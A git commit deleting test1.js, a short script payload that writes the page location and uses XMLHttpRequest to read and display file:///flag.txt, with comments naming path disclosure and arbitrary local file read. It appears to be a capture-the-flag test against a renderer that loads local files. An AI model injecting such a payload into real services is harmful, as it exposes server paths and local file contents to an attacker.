6d114a4228f0c3c3cd48dad0b453753e1f59d7da
Nam Do <69895129+namdt5125@users.noreply.github.com>
2025-03-12 00:28:40 +0700

    Delete test1.js

--- test1.js
+++
@@ -1,9 +0,0 @@
-<script>
- // Path Disclosure
- document.write(window.location);
- // Arbitrary Local File Read
- xhr = new XMLHttpRequest;
- xhr.onload=function(){document.write((this.responseText))};
- xhr.open("GET","file:///flag.txt");
- xhr.send();
-</script>
